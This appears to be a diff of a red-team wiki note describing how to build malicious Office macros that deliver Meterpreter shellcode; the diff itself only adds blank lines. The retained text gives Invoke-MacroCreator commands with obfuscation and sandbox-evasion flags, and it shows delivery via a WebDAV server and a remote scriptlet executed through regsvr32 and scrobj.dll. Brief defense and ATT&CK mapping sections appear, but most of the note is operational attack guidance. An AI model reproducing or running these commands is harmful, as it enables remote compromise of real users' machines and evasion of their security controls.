@@ -35,6 +35,8 @@ This procedure involves creating a macro that delivers and executes Meterpreter 
 
 This procedure involves creating a macro that delivers and executes Meterpreter shellcode. The macro is typically delivered via a malicious document, such as a Word or Excel file, and is designed to bypass typical security measures. Once the macro is executed, it delivers the Meterpreter shellcode, which allows the attacker to gain remote access to the target system. This type of attack is commonly used in targeted attacks against businesses and organizations. Technical details include encoding the shellcode and embedding it in the macro, and using various techniques to bypass security measures such as antivirus and firewalls. The business value of this attack is that it allows attackers to gain access to sensitive information and systems, which can be used for financial gain or other malicious purposes.
 
+ 
+
 ## Requirements
 
 1. Access to a system with the ability to create macros
@@ -42,6 +44,8 @@ This procedure involves creating a macro that delivers and executes Meterpreter 
 1. A malicious document to deliver the macro
 
 1. Knowledge of encoding and embedding shellcode in the macro
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ This procedure involves creating a macro that delivers and executes Meterpreter 
 
 1. Implement security measures such as network segmentation and access controls to limit the impact of a successful attack
 
+ 
+
 ## Objectives
 
 1. Deliver and execute Meterpreter shellcode on the target system
@@ -59,11 +65,19 @@ This procedure involves creating a macro that delivers and executes Meterpreter 
 
 1. Gain remote access to the target system
 
+ 
+
 # Instructions
 
 1. To create a macro for meterpreter shellcode delivery, use the Invoke-MacroCreator command with the following arguments:
 
+ 
+
+
+
 **Code**: [[# Shellcode embedded in the body of the MS-Word do]]
+
+
 
 > 1. -i: Specifies the input file containing meterpreter shellcode.
 2. -t: Specifies the type of payload. In this case, it is shellcode.
@@ -73,11 +87,17 @@ This procedure involves creating a macro that delivers and executes Meterpreter 
 6. -o: Enables obfuscation of the macro code.
 7. -e: Enables sandbox evasion techniques.
 
+
+
 **Command** ([[Create MS-Word document with embedded shellcode]]):
 
 ```bash
 Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
 ```
+
+
+
+
 
 **Command** ([[Deliver shellcode over WebDAV covert channel]]):
 
@@ -85,11 +105,17 @@ Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
 Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
 ```
 
+
+
+
+
 **Command** ([[Deliver scriptlet over bibliography source covert channel]]):
 
 ```bash
 Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -117,3 +143,5 @@ Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.x
 
 - [[DOCM - Macro Creator]]
 - [[Office - Attacks]]
+
+
